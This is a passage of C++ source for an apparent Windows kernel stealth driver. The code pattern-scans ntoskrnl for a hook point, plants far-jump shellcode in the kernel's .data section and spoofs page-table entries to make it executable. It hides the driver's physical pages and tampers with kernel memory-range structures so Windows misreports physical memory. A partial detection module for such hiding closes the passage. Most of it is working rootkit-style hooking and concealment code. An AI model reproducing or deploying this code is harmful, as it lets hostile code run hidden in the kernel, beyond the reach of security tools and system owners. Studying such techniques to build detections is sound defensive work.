    shellcode[1] = 0x25;  // ModR/M byte for [rip+disp32]

    // displacement (0 means the address is immediately after this instruction)
    *reinterpret_cast<int32_t*>(&shellcode[2]) = 0x00000000;

    // 64-bit absolute address follows immediately after the jump instruction
    *reinterpret_cast<uint64_t*>(&shellcode[6]) = reinterpret_cast<uint64_t>(func);

    uint32_t section_size = 0;
    void* section_base = page_table::find_section_base(reinterpret_cast<void*>(globals::ntos_base),
                                                       &section_size, ".data", 5);

    if (!section_base) {
      log("ERROR", "failed to find .data section in ntoskrnl");
      return STATUS_UNSUCCESSFUL;
    }

    void* target_address = page_table::find_unused_space(section_base, section_size, FAR_JMP_SIZE);

    if (!target_address) {
      log("ERROR", "failed to find unused space in .data section");
      return STATUS_UNSUCCESSFUL;
    }

    // write shellcode to target location
    globals::memcpy(target_address, shellcode, FAR_JMP_SIZE);

    log("INFO", "far jump shellcode written at addr: 0x%p", target_address);
    log("DEBUG", "jump target: 0x%llx", reinterpret_cast<uint64_t>(func));

    // make executable
    if (!page_table::spoof_pte_range(reinterpret_cast<uintptr_t>(target_address), FAR_JMP_SIZE,
                                     false)) {
      log("ERROR", "failed to spoof pte range at target address");
      return STATUS_UNSUCCESSFUL;
    }

    // update hook address
    *reinterpret_cast<std::uintptr_t*>(globals::hook_address) =
        reinterpret_cast<uintptr_t>(target_address);

    globals::shell_address = target_address;

    log("INFO", "hook installed successfully");
    return STATUS_SUCCESS;
  }

  NTSTATUS initialize_physical_memory_ranges() {
    auto physical_ranges = globals::mm_get_physical_memory_ranges();
    if (!physical_ranges) {
      log("ERROR", "MmGetPhysicalMemoryRanges failed\n");
      return STATUS_UNSUCCESSFUL;
    }

    auto lowest_pfn = MAXULONG_PTR;
    auto highest_pfn = static_cast<ULONG_PTR>(0);

    // iterate through all memory ranges
    for (auto i = 0ul; physical_ranges[i].BaseAddress.QuadPart != 0 ||
                       physical_ranges[i].NumberOfBytes.QuadPart != 0;
         i++) {
      auto base_address = physical_ranges[i].BaseAddress;
      auto number_of_bytes = physical_ranges[i].NumberOfBytes;

      // skip invalid ranges
      if (number_of_bytes.QuadPart == 0) {
        continue;
      }

      // convert physical address to PFN (Page Frame Number)
      auto start_pfn = static_cast<ULONG_PTR>(base_address.QuadPart >> 12);
      auto end_pfn =
          static_cast<ULONG_PTR>((base_address.QuadPart + number_of_bytes.QuadPart - 1) >> 12);

      log("DEBUG", "Memory Range %d: PFN 0x%p - 0x%p (Physical: 0x%llx - 0x%llx)\n", i,
          reinterpret_cast<PVOID>(start_pfn), reinterpret_cast<PVOID>(end_pfn),
          base_address.QuadPart, base_address.QuadPart + number_of_bytes.QuadPart - 1);

      // update lowest PFN
      if (start_pfn < lowest_pfn) {
        lowest_pfn = start_pfn;
      }

      // update highest PFN
      if (end_pfn > highest_pfn) {
        highest_pfn = end_pfn;
      }
    }

    // set the global variables
    globals::mm_lowest_physical_page = lowest_pfn;
    globals::mm_highest_physical_page = highest_pfn;

    log("SUCCESS", "Physical Memory Summary:\n");
    log("INFO", "    Lowest PFN:  0x%p\n",
        reinterpret_cast<PVOID>(globals::mm_lowest_physical_page));
    log("INFO", "    Highest PFN: 0x%p\n",
        reinterpret_cast<PVOID>(globals::mm_highest_physical_page));
    log("INFO", "    Total Pages: 0x%p\n",
        reinterpret_cast<PVOID>(globals::mm_highest_physical_page -
                                globals::mm_lowest_physical_page + 1));

    // free the memory ranges array
    globals::ex_free_pool_with_tag(physical_ranges, 0);

    return STATUS_SUCCESS;
  }

  /**
   * @brief Manipulates flag within MiSystemPartition
   * @return NTSTATUS indicating success or failure
   *
   * Nulls specific offset (based off Windows build version) within MiSystemPartition which results
   * in Windows reporting the incorrect physical memory ranges. This is experimental.
   */
  NTSTATUS manipulate_system_partition() {
    log("INFO", "starting MiGetPhysicalMemoryRanges manipulation test");

    // determine offset based on Windows version
    uint32_t offset = 0;
    uint32_t build = globals::build_version;

    if (build >= 19041 && build <= 22000) {
      // windows 10 20H2 (19042) to Windows 11 21H2 (22000)
      offset = 0x1B10;
      log("INFO", "detected Windows 10 20H2 - Windows 11 21H2 (build %u), using offset 0x1B10",
          build);
    } else if (build >= 22621 && build <= 22631) {
      // windows 11 22H2 (22621) and 23H2 (22631)
      offset = 0x4290;
      log("INFO", "detected Windows 11 22H2/23H2 (build %u), using offset 0x4290", build);
    } else if (build >= 26100) {
      // windows 11 24H2 (26100+)
      offset = 0x4850;
      log("INFO", "detected Windows 11 24H2 (build %u), using offset 0x4850", build);
    } else {
      log("ERROR", "unsupported Windows build: %u\n", build);
      return STATUS_NOT_SUPPORTED;
    }

    auto flag_ptr =
        reinterpret_cast<ULONG64*>(reinterpret_cast<UCHAR*>(globals::mi_system_partition) + offset);

    *flag_ptr = 0;
    log("INFO", "set flag in MiSystemPartition at offset 0x%X to 0\n", offset);

    return STATUS_SUCCESS;
  }

  /**
   * @brief Modifies the start of the last range within MmGetPhysicalMemoryRanges
   * @return NTSTATUS indicating success or failure
   *
   * Manipulates physical memory ranges directly by casting a PHYSICAL_MEMORY_DESCRIPTOR struct on
   * MmPhysicalMemoryBlock and manipulating the struct directly. This is experimental and I have no
   * clue where I'm going to go with this.
   */
  NTSTATUS modify_last_memory_range() {
    log("INFO", "Modifying last physical memory range to have zero size\n");

    struct PHYSICAL_MEMORY_DESCRIPTOR {
      ULONG NumberOfRanges;
      ULONG NumberOfPages;
      struct {
        ULONG64 BasePage;   // Start PFN
        ULONG64 PageCount;  // Number of pages
      } Run[1];             // Variable length array
    };

    auto mm_block_ptr =
        reinterpret_cast<PHYSICAL_MEMORY_DESCRIPTOR**>(globals::mm_physical_memory_block);
    auto mm_block = *mm_block_ptr;

    if (!mm_block) {
      log("ERROR", "MmPhysicalMemoryBlock is NULL\n");
      return STATUS_UNSUCCESSFUL;
    }

    if (mm_block->NumberOfRanges == 0) {
      log("ERROR", "no memory ranges present\n");
      return STATUS_UNSUCCESSFUL;
    }

    // get the last range index
    ULONG last_range_index = mm_block->NumberOfRanges - 1;

    // save original values
    ULONG64 original_page_count = mm_block->Run[last_range_index].PageCount;
    ULONG original_total_pages = mm_block->NumberOfPages;

    log("INFO", "last range (index %u): BasePage=0x%llX, PageCount=0x%llX\n", last_range_index,
        mm_block->Run[last_range_index].BasePage, mm_block->Run[last_range_index].PageCount);

    // set the last range's PageCount to 0
    mm_block->Run[last_range_index].PageCount = 0;

    // adjust total page count
    mm_block->NumberOfPages -= original_page_count;

    log("INFO", "set last range PageCount to 0 (end = start)\n");

    // test
    auto result = globals::mm_get_physical_memory_ranges();

    if (!result) {
      log("WARNING", "MmGetPhysicalMemoryRanges returned NULL\n");
    } else {
      log("SUCCESS", "MmGetPhysicalMemoryRanges returned: 0x%p\n", result);

      // check the last range in the result
      ULONG range_count = 0;
      while (result[range_count].NumberOfBytes.QuadPart != 0 ||
             result[range_count].BaseAddress.QuadPart != 0) {
        range_count++;
      }

      log("INFO", "returned %u ranges (was %u)\n", range_count, mm_block->NumberOfRanges);

      if (range_count > 0) {
        auto last_returned = range_count - 1;
        log("INFO", "last returned range: Base=0x%llX, Size=0x%llX\n",
            result[last_returned].BaseAddress.QuadPart,
            result[last_returned].NumberOfBytes.QuadPart);

        if (result[last_returned].NumberOfBytes.QuadPart == 0) {
          log("SUCCESS", "last range now has zero size!\n");
        }
      }

      globals::ex_free_pool_with_tag(result, 0);
    }

    return STATUS_SUCCESS;
  }

  /**
   * @brief Initialize all global function pointers and offsets from PDB data
   * @param local_offsets Reference to PDB offset structure containing resolved
   * addresses
   * @return NTSTATUS indicating success or failure
   *
   * Master initialization function that sets up all global variables with
   * resolved system function addresses and structure offsets. Includes memory
   * management, process/thread, executive, runtime library, and CRT function
   * assignments. Also performs pattern scanning for hook points and exports
   * resolution.
   */
  auto scan_offsets(pdb_offsets& local_offsets) -> NTSTATUS {
    if (globals::initialized)
      return STATUS_NOT_FOUND;

    globals::driver_alloc_base = local_offsets.DriverAllocBase;
    globals::driver_size = local_offsets.DriverSize;

    globals::dbg_print = reinterpret_cast<function_types::dbg_print_t>(local_offsets.DbgPrint);

    globals::ntos_base = local_offsets.NtoskrnlBase;
    globals::driver_hide_type = local_offsets.DriverHideType;
    globals::dll_hide_type = local_offsets.DllHideType;
    globals::experimental_options = local_offsets.ExperimentalOptions;

    // assign memory management functions
    globals::mm_get_physical_address = reinterpret_cast<function_types::mm_get_physical_address_t>(
        local_offsets.MmGetPhysicalAddress);
    globals::mm_pfn_db = local_offsets.MmPfnDatabase;
    globals::mm_allocate_independent_pages_ex =
        reinterpret_cast<function_types::mm_allocate_independent_pages_ex_t>(
            local_offsets.MmAllocateIndependentPages);
    globals::mm_set_page_protection = reinterpret_cast<function_types::mm_set_page_protection_t>(
        local_offsets.MmSetPageProtection);

    globals::mm_free_independent_pages =
        reinterpret_cast<function_types::mm_free_independent_pages>(
            local_offsets.MmFreeIndependentPages);
    globals::mm_allocate_contiguous_memory =
        reinterpret_cast<function_types::mm_allocate_contiguous_memory_t>(
            local_offsets.MmAllocateContiguousMemory);
    globals::mm_free_contiguous_memory =
        reinterpret_cast<function_types::mm_free_contiguous_memory_t>(
            local_offsets.MmFreeContiguousMemory);
    globals::mm_copy_memory =
        reinterpret_cast<function_types::mm_copy_memory_t>(local_offsets.MmCopyMemory);
    globals::mm_get_virtual_for_physical =
        reinterpret_cast<function_types::mm_get_virtual_for_physical_t>(
            local_offsets.MmGetVirtualForPhysical);
    globals::mm_copy_virtual_memory = reinterpret_cast<function_types::mm_copy_virtual_memory_t>(
        local_offsets.MmCopyVirtualMemory);
    globals::mm_mark_physical_memory_as_bad =
        reinterpret_cast<function_types::mm_mark_physical_memory_as_bad_t>(
            local_offsets.MmMarkPhysicalMemoryAsBad);
    globals::mm_user_probe_address =
        reinterpret_cast<function_types::mm_user_probe_address_t>(local_offsets.MmUserProbeAddress);
    globals::mm_get_system_routine_address =
        reinterpret_cast<function_types::mm_get_system_routine_address_t>(
            local_offsets.MmGetSystemRoutineAddress);
    globals::mm_get_physical_memory_ranges =
        reinterpret_cast<function_types::mm_get_physical_memory_ranges_t>(
            local_offsets.MmGetPhysicalMemoryRanges);
    globals::mm_is_address_valid =
        reinterpret_cast<function_types::mm_is_address_valid_t>(local_offsets.MmIsAddressValid);

    globals::mm_allocate_secure_kernel_pages =
        reinterpret_cast<function_types::mm_allocate_secure_kernel_pages_t>(
            local_offsets.MmAllocateSecureKernelPages);

    globals::mm_physical_memory_block = local_offsets.MmPhysicalMemoryBlock;

    // assign memory info functions
    globals::mi_get_vm_access_logging_partition =
        reinterpret_cast<function_types::mi_get_vm_access_logging_partition_t>(
            local_offsets.MiGetVmAccessLoggingPartition);
    globals::mi_create_decay_pfn =
        reinterpret_cast<function_types::mi_create_decay_pfn_t>(local_offsets.MiCreateDecayPfn);
    globals::mi_get_ultra_page =
        reinterpret_cast<function_types::mi_get_ultra_page_t>(local_offsets.MiGetUltraPage);
    globals::mi_reserve_ptes =
        reinterpret_cast<function_types::mi_reserve_ptes_t>(local_offsets.MiReservePtes);
    globals::mi_get_pte_address =
        reinterpret_cast<function_types::mi_get_pte_address_t>(local_offsets.MiGetPteAddress);
    globals::mi_get_pde_address =
        reinterpret_cast<function_types::mi_get_pde_address_t>(local_offsets.MiGetPdeAddress);
    globals::mi_remove_physical_memory =
        reinterpret_cast<function_types::mi_remove_physical_memory_t>(
            local_offsets.MiRemovePhysicalMemory);
    globals::mi_flush_entire_tb_due_to_attribute_change =
        reinterpret_cast<function_types::mi_flush_entire_tb_due_to_attribute_change_t>(
            local_offsets.MiFlushEntireTbDueToAttributeChange);
    globals::mi_flush_cache_range =
        reinterpret_cast<function_types::mi_flush_cache_range_t>(local_offsets.MiFlushCacheRange);
    globals::mi_get_page_table_pfn_buddy_raw =
        reinterpret_cast<function_types::mi_get_page_table_pfn_buddy_raw_t>(
            local_offsets.MiGetPageTablePfnBuddyRaw);
    globals::mi_set_page_table_pfn_buddy =
        reinterpret_cast<function_types::mi_set_page_table_pfn_buddy_t>(
            local_offsets.MiSetPageTablePfnBuddy);
    globals::mi_lock_page_table_page = reinterpret_cast<function_types::mi_lock_page_table_page_t>(
        local_offsets.MiLockPageTablePage);

    globals::mi_system_partition = local_offsets.MiSystemPartition;

    globals::mi_allocate_large_zero_pages =
        reinterpret_cast<function_types::mi_allocate_large_zero_pages_t>(
            local_offsets.MiAllocateLargeZeroPages);

    // assign proc/obj functions
    globals::ps_loaded_module_list = local_offsets.PsLoadedModuleList;
    globals::ps_acquire_process_exit_synchronization =
        reinterpret_cast<function_types::ps_acquire_process_exit_synchronization_t>(
            local_offsets.PsAcquireProcessExitSynchronization);
    globals::ps_release_process_exit_synchronization =
        reinterpret_cast<function_types::ps_release_process_exit_synchronization_t>(
            local_offsets.PsReleaseProcessExitSynchronization);
    globals::ps_get_process_exit_status =
        reinterpret_cast<function_types::ps_get_process_exit_status_t>(
            local_offsets.PsGetProcessExitStatus);
    globals::ps_set_create_process_notify_routine_ex =
        reinterpret_cast<function_types::ps_set_create_process_notify_routine_ex_t>(
            local_offsets.PsSetCreateProcessNotifyRoutineEx);
    globals::ps_set_create_thread_notify_routine =
        reinterpret_cast<function_types::ps_set_create_thread_notify_routine_t>(
            local_offsets.PsSetCreateThreadNotifyRoutine);
    globals::ps_set_create_process_notify_routine_ex =
        reinterpret_cast<function_types::ps_set_create_process_notify_routine_ex_t>(
            local_offsets.PsSetCreateProcessNotifyRoutineEx);
    globals::ps_lookup_process_by_process_id =
        reinterpret_cast<function_types::ps_lookup_process_by_process_id_t>(
            local_offsets.PsLookupProcessByProcessId);
    globals::ps_lookup_thread_by_thread_id =
        reinterpret_cast<function_types::ps_lookup_thread_by_thread_id_t>(
            local_offsets.PsLookupThreadByThreadId);
    globals::ps_get_next_process_thread =
        reinterpret_cast<function_types::ps_get_next_process_thread_t>(
            local_offsets.PsGetNextProcessThread);
    globals::ps_suspend_thread =
        reinterpret_cast<function_types::ps_suspend_thread_t>(local_offsets.PsSuspendThread);
    globals::ps_resume_thread =
        reinterpret_cast<function_types::ps_suspend_thread_t>(local_offsets.PsResumeThread);
    globals::ps_query_thread_start_address =
        reinterpret_cast<function_types::ps_query_thread_start_address_t>(
            local_offsets.PsQueryThreadStartAddress);
    globals::ps_get_current_thread_id =
        reinterpret_cast<function_types::ps_get_current_thread_id_t>(
            local_offsets.PsGetCurrentThreadId);
    globals::ps_get_process_peb =
        reinterpret_cast<function_types::ps_get_process_peb_t>(local_offsets.PsGetProcessPeb);
    globals::ps_get_process_image_file_name =
        reinterpret_cast<function_types::ps_get_process_image_file_name_t>(
            local_offsets.PsGetProcessImageFileName);
    globals::io_get_current_process = reinterpret_cast<function_types::io_get_current_process_t>(
        local_offsets.IoGetCurrentProcess);
    globals::obf_dereference_object = reinterpret_cast<function_types::obf_dereference_object_t>(
        local_offsets.ObfDereferenceObject);

    // processor support functions
    globals::psp_exit_thread = local_offsets.PspExitThread;

    // assign executive functions
    globals::ex_allocate_pool2 =
        reinterpret_cast<function_types::ex_allocate_pool2_t>(local_offsets.ExAllocatePool2);
    globals::ex_free_pool_with_tag =
        reinterpret_cast<function_types::ex_free_pool_with_tag_t>(local_offsets.ExFreePoolWithTag);
    globals::ex_get_previous_mode =
        reinterpret_cast<function_types::ex_get_previous_mode_t>(local_offsets.ExGetPreviousMode);

    globals::ke_balance_set_manager = local_offsets.KeBalanceSetManager;
    globals::ke_raise_irql_to_dpc_level =
        reinterpret_cast<function_types::ke_raise_irql_to_dpc_level_t>(
            local_offsets.KeRaiseIrqlToDpcLevel);
    globals::ke_lower_irql =
        reinterpret_cast<function_types::ke_lower_irql_t>(local_offsets.KeLowerIrql);
    globals::ki_process_list_head = reinterpret_cast<PLIST_ENTRY>(local_offsets.KiProcessListHead);
    globals::ki_page_fault = local_offsets.KiPageFault;
    globals::ke_flush_single_tb =
        reinterpret_cast<function_types::ke_flush_single_tb_t>(local_offsets.KeFlushSingleTb);

    globals::ke_query_system_time_precise =
        reinterpret_cast<function_types::ke_query_system_time_precise_t>(
            local_offsets.KeQuerySystemTimePrecise);

    globals::ke_initialize_apc =
        reinterpret_cast<function_types::ke_initialize_apc_t>(local_offsets.KeInitializeApc);

    globals::ke_insert_queue_apc =
        reinterpret_cast<function_types::ke_insert_queue_apc_t>(local_offsets.KeInsertQueueApc);

    globals::ke_usermode_callback =
        reinterpret_cast<function_types::ke_usermode_callback_t>(local_offsets.KeUsermodeCallback);

    globals::ke_alert_thread =
        reinterpret_cast<function_types::ke_alert_thread_t>(local_offsets.KeAlertThread);

    globals::ke_delay_execution_thread =
        reinterpret_cast<function_types::ke_delay_execution_thread_t>(
            local_offsets.KeDelayExecutionThread);

    globals::ki_kva_shadow = local_offsets.KiKvaShadow;

    // assign runtime library functions
    globals::rtl_init_ansi_string =
        reinterpret_cast<function_types::rtl_init_ansi_string_t>(local_offsets.RtlInitAnsiString);
    globals::rtl_init_unicode_string = reinterpret_cast<function_types::rtl_init_unicode_string_t>(
        local_offsets.RtlInitUnicodeString);
    globals::rtl_ansi_string_to_unicode_string =
        reinterpret_cast<function_types::rtl_ansi_string_to_unicode_string_t>(
            local_offsets.RtlAnsiStringToUnicodeString);
    globals::rtl_compare_unicode_string =
        reinterpret_cast<function_types::rtl_compare_unicode_string_t>(
            local_offsets.RtlCompareUnicodeString);
    globals::rtl_free_unicode_string = reinterpret_cast<function_types::rtl_free_unicode_string_t>(
        local_offsets.RtlFreeUnicodeString);
    globals::rtl_get_version =
        reinterpret_cast<function_types::rtl_get_version_t>(local_offsets.RtlGetVersion);
    globals::rtl_create_user_thread = reinterpret_cast<function_types::rtl_create_user_thread_t>(
        local_offsets.RtlCreateUserThread);

    // zw/nt functions
    globals::zw_open_process =
        reinterpret_cast<function_types::zw_open_process_t>(local_offsets.ZwOpenProcess);
    globals::zw_close = reinterpret_cast<function_types::zw_close_t>(local_offsets.ZwClose);
    globals::zw_wait_for_single_object =
        reinterpret_cast<function_types::zw_wait_for_single_object_t>(
            local_offsets.ZwWaitForSingleObject);

    globals::zw_query_information_process =
        reinterpret_cast<function_types::zw_query_information_process_t>(
            local_offsets.ZwQueryInformationProcess);

    globals::nt_alert_resume_thread = reinterpret_cast<function_types::nt_alert_resume_thread_t>(
        local_offsets.NtAlertResumeThread);

    // assign crt functions
    globals::memcpy = reinterpret_cast<function_types::memcpy_t>(local_offsets.memcpy);
    globals::memset = reinterpret_cast<function_types::memset_t>(local_offsets.memset);
    globals::memcmp = reinterpret_cast<function_types::memcmp_t>(local_offsets.memcmp);
    globals::strncmp = reinterpret_cast<function_types::strncmp_t>(local_offsets.strncmp);
    globals::strlen = reinterpret_cast<function_types::strlen_t>(local_offsets.strlen);
    globals::_wcsicmp = reinterpret_cast<function_types::_wcsicmp_t>(local_offsets._wcsicmp);
    globals::rand = reinterpret_cast<function_types::rand_t>(local_offsets.rand);
    globals::srand = reinterpret_cast<function_types::srand_t>(local_offsets.srand);
    globals::swprintf_s = reinterpret_cast<function_types::swprintf_s_t>(local_offsets.swprintf_s);
    globals::snprintf = reinterpret_cast<function_types::snprintf_t>(local_offsets.snprintf);

    // assign struct offsets
    globals::active_process_links = local_offsets.ActiveProcessLinks;
    globals::_eprocess_thread_list_head = local_offsets._EPROCESS_ThreadListHead;
    globals::_kprocess_thread_list_head = local_offsets._KPROCESS_ThreadListHead;
    globals::_eprocess_shared_commit_links = local_offsets._EPROCESS_SharedCommitLinks;
    globals::_eprocess_shared_commit_charge = local_offsets._EPROCESS_SharedCommitCharge;
    globals::_eprocess_rundown_protect = local_offsets._EPROCESS_RundownProtect;
    globals::_eprocess_vm = local_offsets._EPROCESS_Vm;
    globals::_eprocess_flags3 = local_offsets._EPROCESS_Flags3;

    globals::hook_address =
        scan(globals::ntos_base, ("48 8B 05 ? ? ? ? 75 07 48 8B 05 ? ? ? ? E8 ? ? ? ?"))
            .resolve_lea();

    if (!globals::hook_address) {
      log("ERROR", "hook pattern not found in ntoskrnl 1");
      globals::hook_address =
          scan(globals::ntos_base,
               ("48 89 05 ? ? ? ? 48 8D 05 ? ? ? ? 48 89 05 ? ? ? ? 48 8D 05 ? ? "
                "? ? 48 89 05 ? ? ? ? E8 ? ? ? ? E8 ? ? ? ? E8 ? ? ? ? C6 05 ? ? "
                "? ? ? E8 ? ? ? ? 48 63 D8"))
              .resolve_lea();
      if (!globals::hook_address) {
        log("ERROR", "hook pattern not found in ntoskrnl 2");
        globals::hook_address =
            scan(globals::ntos_base, ("48 8B 05 ? ? ? ? 74 49 E8 ? ? ? ? 8B C8")).resolve_mov();
        if (!globals::hook_address) {
          log("ERROR", "hook pattern not found in ntoskrnl 3");
          return STATUS_NOT_FOUND;
        }
      }
    }

    globals::build_version = utils::get_windows_version();

    UNICODE_STRING routine_name;
    globals::rtl_init_unicode_string(&routine_name, L"KeFlushEntireTb");
    globals::ke_flush_entire_tb =
        (function_types::ke_flush_entire_tb_t)globals::mm_get_system_routine_address(&routine_name);
    if (!globals::ke_flush_entire_tb) {
      log("ERROR", "failed to find export KeFlushEntireTb");
      return STATUS_NOT_FOUND;
    }

    globals::rtl_init_unicode_string(&routine_name, L"KeInvalidateAllCaches");
    globals::ke_invalidate_all_caches =
        (function_types::ke_invalidate_all_caches_t)globals::mm_get_system_routine_address(
            &routine_name);
    if (!globals::ke_invalidate_all_caches) {
      log("ERROR", "failed to find export KeInvalidateAllCaches");
      return STATUS_NOT_FOUND;
    }

    if (!globals::initialized) {
      globals::initialized = true;

      NTSTATUS initialize_physical_memory_ranges_status = initialize_physical_memory_ranges();
      if (!NT_SUCCESS(initialize_physical_memory_ranges_status)) {
        log("ERROR", "failed to init phys memory ranges");
        return STATUS_INSUFFICIENT_RESOURCES;
      }

      if (static_cast<experimental_options>(globals::experimental_options) ==
          experimental_options::MANIPULATE_SYSTEM_PARTITION) {
        NTSTATUS manipulate_system_partition_status = manipulate_system_partition();
        if (!NT_SUCCESS(manipulate_system_partition_status)) {
          log("ERROR", "unsupported win build");
          return STATUS_INSUFFICIENT_RESOURCES;
        }
      }
      NTSTATUS physical_init_status = physical::init();
      if (!NT_SUCCESS(physical_init_status)) {
        log("ERROR", "failed to init phys mem read/write lib");
        return STATUS_INSUFFICIENT_RESOURCES;
      }
    }

    return STATUS_SUCCESS;
  }

  /**
   * @brief Apply stealth hiding techniques to driver memory page tables using physical operations
   * @param address Base virtual address of driver memory
   * @param size Size of driver memory region in bytes
   * @return NTSTATUS indicating success or failure
   *
   * Walks through all driver pages and hides the lowest level page table structures.
   * For 4KB pages: hides PT pages containing PTEs
   * For 2MB pages: hides PD pages containing PDEs
   * For 1GB pages: hides PDPT pages containing PDPTEs
   */
  auto hide_driver_pages(const uintptr_t address, const uintptr_t size) -> NTSTATUS {
    log("INFO", "starting to hide driver pages at address 0x%llx with size 0x%llx", address, size);

    // get current process CR3
    PEPROCESS current_process = globals::io_get_current_process();
    uintptr_t cr3_pa = physical::get_process_directory_base(current_process);

    if (!cr3_pa) {
      log("ERROR", "failed to get CR3 physical address");
      return STATUS_UNSUCCESSFUL;
    }

    size_t pages_processed = 0;

    for (uintptr_t current_addr = address; current_addr < address + size;) {
      ADDRESS_TRANSLATION_HELPER helper;
      helper.AsUInt64 = current_addr;

      // read PML4E
      PML4E_64 pml4e = {0};
      uintptr_t pml4e_pa = cr3_pa + helper.AsIndex.Pml4 * sizeof(PML4E_64);
      if (!NT_SUCCESS(physical::read_physical_address(pml4e_pa, &pml4e, sizeof(pml4e)))) {
        current_addr += PAGE_SIZE;
        continue;
      }

      if (!pml4e.Present) {
        current_addr += PAGE_SIZE;
        continue;
      }

      // read PDPTE
      PDPTE_64 pdpte = {0};
      uintptr_t pdpt_pa = PFN_TO_PAGE(pml4e.PageFrameNumber);
      uintptr_t pdpte_pa = pdpt_pa + helper.AsIndex.Pdpt * sizeof(PDPTE_64);
      if (!NT_SUCCESS(physical::read_physical_address(pdpte_pa, &pdpte, sizeof(pdpte)))) {
        current_addr += PAGE_SIZE;
        continue;
      }

      if (!pdpte.Present) {
        current_addr += PAGE_SIZE;
        continue;
      }

      // check for 1GB large page
      if (pdpte.LargePage) {
        uintptr_t page_pfn = pdpte.PageFrameNumber;

        // calculate the offset within the 1GB page
        uintptr_t offset_in_1gb = current_addr & 0x3FFFFFFF;
        uintptr_t pfn_offset = offset_in_1gb >> 12;

        // hide the actual physical page
        uintptr_t actual_pfn = page_pfn + pfn_offset;
        bool hide_result = mem::hide_physical_memory(
            actual_pfn, static_cast<hide_type>(globals::driver_hide_type));

        if (hide_result) {
          log("INFO", "hidden driver page PFN 0x%llx from 1GB page at VA 0x%llx", actual_pfn,
              current_addr);
        } else {
          log("WARNING", "failed to hide driver page PFN 0x%llx at VA 0x%llx", actual_pfn,
              current_addr);
        }

        pages_processed++;
        current_addr += PAGE_SIZE;
        continue;
      }

      // read PDE
      PDE_64 pde = {0};
      uintptr_t pd_pa = PFN_TO_PAGE(pdpte.PageFrameNumber);
      uintptr_t pde_pa = pd_pa + helper.AsIndex.Pd * sizeof(PDE_64);
      if (!NT_SUCCESS(physical::read_physical_address(pde_pa, &pde, sizeof(pde)))) {
        current_addr += PAGE_SIZE;
        continue;
      }

      if (!pde.Present) {
        current_addr += PAGE_SIZE;
        continue;
      }

      // check for 2MB large page
      if (pde.LargePage) {
        //
        uintptr_t page_pfn = pde.PageFrameNumber;

        // calculate the offset within the 2MB page
        uintptr_t offset_in_2mb = current_addr & 0x1FFFFF;
        uintptr_t pfn_offset = offset_in_2mb >> 12;

        // hide the actual physical page
        uintptr_t actual_pfn = page_pfn + pfn_offset;
        bool hide_result = mem::hide_physical_memory(
            actual_pfn, static_cast<hide_type>(globals::driver_hide_type));

        if (hide_result) {
          log("INFO", "hidden driver page PFN 0x%llx from 2MB page at VA 0x%llx", actual_pfn,
              current_addr);
        } else {
          log("WARNING", "failed to hide driver page PFN 0x%llx at VA 0x%llx", actual_pfn,
              current_addr);
        }

        pages_processed++;
        current_addr += PAGE_SIZE;
        continue;
      }

      // read the PTE
      PTE_64 pte = {0};
      uintptr_t pt_pa = PFN_TO_PAGE(pde.PageFrameNumber);
      uintptr_t pte_pa = pt_pa + helper.AsIndex.Pt * sizeof(PTE_64);
      if (!NT_SUCCESS(physical::read_physical_address(pte_pa, &pte, sizeof(pte)))) {
        current_addr += PAGE_SIZE;
        continue;
      }

      if (!pte.Present) {
        current_addr += PAGE_SIZE;
        continue;
      }

      uintptr_t driver_page_pfn = pte.PageFrameNumber;
      bool hide_result = mem::hide_physical_memory(
          driver_page_pfn, static_cast<hide_type>(globals::driver_hide_type));

      if (hide_result) {
        log("INFO", "hidden driver page PFN 0x%llx at VA 0x%llx", driver_page_pfn, current_addr);
      } else {
        log("WARNING", "failed to hide driver page PFN 0x%llx at VA 0x%llx", driver_page_pfn,
            current_addr);
      }

      pages_processed++;
      current_addr += PAGE_SIZE;
    }

    log("INFO", "completed hiding %zu driver pages for range 0x%llx-0x%llx", pages_processed,
        address, address + size);

    return STATUS_SUCCESS;
  }
}  // namespace init

```

`driver/mem/detection.cpp`:

```cpp
#pragma once
#include "../def/globals.hpp"
#include "page_table.hpp"
#include "phys.hpp"
#include "detection.hpp"

namespace detections {
#define MAX_RESULTS 10000  // max number of entries we can store

#define STATUS_OK 0
#define STATUS_PARITY_ERROR_SET 1
#define STATUS_PFN_EXISTS_NOT_SET 2
#define STATUS_COPY_FAILED 3
#define STATUS_SUPERVISOR_ERROR 4
#define STATUS_MISMATCHING_EPROCESS 4

  // struct to hold page table entry information
  typedef struct _page_table_entry_info {
    uintptr_t virtual_address;
    uintptr_t physical_address;
    uint8_t parity_error_flag;            // 1 if parity error was detected in the PFN entry
    uint8_t pfn_exists_flag;              // 1 if PfnExists is not set in the PFN entry
    uint8_t supervisor_flag;              // 1 if supervisor bit is set
    uint8_t no_associated_eprocess_flag;  // 1 if a mismatching eprocess is found
                                          // within MMPFN.u4.PteFrame
  } page_table_entry_info, *ppage_table_entry_info;

  // global array to store results
  page_table_entry_info g_results[MAX_RESULTS];
  uint32_t g_result_count = 0;

  /**
   * @brief Check if a page table entry frame (MMPFN.u4.PteFrame) has mismatching
   * EPROCESS ownership
   * @param physical_address Physical address of the page frame to check
   * @param no_associated_eprocess_flag Output flag set if EPROCESS mismatch
   * detected
   * @return STATUS_OK if ownership matches, STATUS_MISMATCHING_EPROCESS otherwise
   *
   * Validates that the EPROCESS associated with a page frame number matches the
   * expected target process. Detects usage of pages that don't belong to the
   * process.
   */
  auto check_pte_frame(uintptr_t physical_address, uint8_t* no_associated_eprocess_flag)
      -> uint32_t {
    // get PFN from physical address
    uintptr_t page_frame_number = physical_address >> PAGE_SHIFT;

    // get PFN entry address
    uintptr_t pfn_entry_addr =
        *reinterpret_cast<uintptr_t*>(globals::mm_pfn_db) + 0x30 * page_frame_number;

    // get the process from the PFN entry
    PEPROCESS process =
        globals::mi_get_page_table_pfn_buddy_raw(reinterpret_cast<void*>(pfn_entry_addr));
    char* process_name = process ? globals::ps_get_process_image_file_name(process) : nullptr;

    // if there's no associated process for the PML4E PFN, then flag
    if (!process) {
      *no_associated_eprocess_flag = 1;
      log("INFO", "could not determine process owning PFN");
      return STATUS_MISMATCHING_EPROCESS;
    }

    // if the target eprocess and the one obtained above do not match, then flag
    if (process != globals::proc) {
      *no_associated_eprocess_flag = 1;
      log("INFO", "mismatch eprocess found in PFN: %s", process_name ? process_name : "<unk>");
      return STATUS_MISMATCHING_EPROCESS;
    } else {
      log("INFO", "process owning PFN: %s", process_name ? process_name : "<unk>");
    }

    return STATUS_OK;
  }

  /**
   * @brief Test physical memory accessibility and check for stealth hiding flags
   * @param physical_address Physical address to test
   * @param parity_error_flag Output flag set if parity error detected
